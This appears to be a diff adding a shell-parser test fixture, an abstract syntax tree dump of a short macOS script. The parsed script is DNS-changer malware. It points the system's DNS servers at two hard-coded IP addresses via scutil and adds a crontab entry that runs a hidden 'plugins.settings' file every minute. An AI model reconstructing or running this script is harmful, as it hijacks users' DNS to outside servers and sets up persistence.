@@ -1,0 +1,101 @@
+CommandNode(lineno=2, pos=(12, 28), parts=[
+  WordNode(lineno=2, pos=(12, 28), word='s1=85.255.114.88'),
+])
+CommandNode(lineno=3, pos=(29, 46), parts=[
+  WordNode(lineno=3, pos=(29, 46), word='s2=85.255.112.127'),
+])
+CommandNode(lineno=4, pos=(47, 80), parts=[
+  AssignmentNode(lineno=4, pos=(47, 80), word='path=/Library/Internet Plug-Ins'),
+])
+CommandNode(lineno=6, pos=(82, 225), parts=[
+  AssignmentNode(lineno=6, pos=(82, 225), word="PSID=$( (/usr/sbin/scutil | grep PrimaryService | sed -e 's/.*PrimaryService : //')<< EOF\nopen\nget State:/Network/Global/IPv4\nd.show\nquit\nEOF\n)", parts=[
+    CommandsubstitutionNode(command=
+      CompoundNode(lineno=6, list=[
+        ReservedwordNode(lineno=6, pos=(90, 91), word='('),
+        PipelineNode(lineno=6, pos=(91, 164), parts=[
+          CommandNode(lineno=6, pos=(91, 107), parts=[
+            WordNode(lineno=6, pos=(91, 107), word='/usr/sbin/scutil'),
+          ]),
+          PipeNode(lineno=6, pipe='|', pos=(108, 109)),
+          CommandNode(lineno=6, pos=(110, 129), parts=[
+            WordNode(lineno=6, pos=(110, 114), word='grep'),
+            WordNode(lineno=6, pos=(115, 129), word='PrimaryService'),
+          ]),
+          PipeNode(lineno=6, pipe='|', pos=(130, 131)),
+          CommandNode(lineno=6, pos=(132, 164), parts=[
+            WordNode(lineno=6, pos=(132, 135), word='sed'),
+            WordNode(lineno=6, pos=(136, 138), word='-e'),
+            WordNode(lineno=6, pos=(139, 164), word='s/.*PrimaryService : //'),
+          ]),
+        ]),
+        ReservedwordNode(lineno=6, pos=(164, 165), word=')'),
+      ], pos=(90, 171), redirects=[
+        RedirectNode(heredoc=
+          HeredocNode(lineno=10, pos=(172, 223), value='open\nget State:/Network/Global/IPv4\nd.show\nquit\nEOF'), lineno=6, output=
+          WordNode(lineno=6, pos=(168, 171), word='EOF'), pos=(165, 223), type='<<'),
+      ]), lineno=6, pos=(87, 172)),
+  ]),
+])
+CommandNode(lineno=14, pos=(227, 250), parts=[
+  WordNode(lineno=8, pos=(227, 243), word='/usr/sbin/scutil'),
+  RedirectNode(heredoc=
+    HeredocNode(lineno=13, pos=(251, 341), value='open\nd.init\nd.add ServerAddresses * $s1 $s2 \nset State:/Network/Service/$PSID/DNS\nquit\nEOF'), lineno=8, output=
+    WordNode(lineno=8, pos=(247, 250), word='EOF'), pos=(244, 341), type='<<'),
+])
+CommandNode(lineno=16, pos=(343, 383), parts=[
+  AssignmentNode(lineno=16, pos=(343, 383), word='exist=`crontab -l|grep plugins.settings`', parts=[
+    CommandsubstitutionNode(command=
+      PipelineNode(lineno=16, pos=(350, 382), parts=[
+        CommandNode(lineno=16, pos=(350, 360), parts=[
+          WordNode(lineno=16, pos=(350, 357), word='crontab'),
+          WordNode(lineno=16, pos=(358, 360), word='-l'),
+        ]),
+        PipeNode(lineno=16, pipe='|', pos=(360, 361)),
+        CommandNode(lineno=16, pos=(361, 382), parts=[
+          WordNode(lineno=16, pos=(361, 365), word='grep'),
+          WordNode(lineno=16, pos=(366, 382), word='plugins.settings'),
+        ]),
+      ]), lineno=16, pos=(349, 383)),
+  ]),
+])
+CompoundNode(lineno=22, list=[
+  IfNode(lineno=22, pos=(385, 524), parts=[
+    ReservedwordNode(lineno=18, pos=(385, 387), word='if'),
+    ListNode(lineno=18, pos=(388, 407), parts=[
+        CommandNode(lineno=18, pos=(388, 406), parts=[
+          WordNode(lineno=18, pos=(388, 389), word='['),
+          WordNode(lineno=18, pos=(390, 398), word='$exist', parts=[
+            ParameterNode(lineno=18, pos=(391, 397), value='exist'),
+          ]),
+          WordNode(lineno=18, pos=(399, 401), word='=='),
+          WordNode(lineno=18, pos=(402, 404)),
+          WordNode(lineno=18, pos=(405, 406), word=']'),
+        ]),
+        OperatorNode(lineno=18, op=';', pos=(406, 407)),
+      ]),
+    ReservedwordNode(lineno=18, pos=(408, 412), word='then'),
+    ListNode(lineno=22, pos=(414, 522), parts=[
+        CommandNode(lineno=19, pos=(414, 484), parts=[
+          WordNode(lineno=19, pos=(414, 418), word='echo'),
+          WordNode(lineno=19, pos=(419, 472), word='* * * * * "$path/plugins.settings">/dev/null 2>&1', parts=[
+            ParameterNode(lineno=19, pos=(432, 437), value='path'),
+          ]),
+          RedirectNode(lineno=19, output=
+            WordNode(lineno=19, pos=(475, 484), word='cron.inst'), pos=(473, 484), type='>'),
+        ]),
+        OperatorNode(lineno=20, op='\n', pos=(484, 485)),
+        CommandNode(lineno=20, pos=(486, 503), parts=[
+          WordNode(lineno=20, pos=(486, 493), word='crontab'),
+          WordNode(lineno=20, pos=(494, 503), word='cron.inst'),
+        ]),
+        OperatorNode(lineno=21, op='\n', pos=(503, 504)),
+        CommandNode(lineno=21, pos=(505, 521), parts=[
+          WordNode(lineno=21, pos=(505, 507), word='rm'),
+          WordNode(lineno=21, pos=(508, 511), word='-rf'),
+          WordNode(lineno=21, pos=(512, 521), word='cron.inst'),
+        ]),
+        OperatorNode(lineno=22, op='\n', pos=(521, 522)),
+      ]),
+    ReservedwordNode(lineno=22, pos=(522, 524), word='fi'),
+  ]),
+], pos=(385, 524))
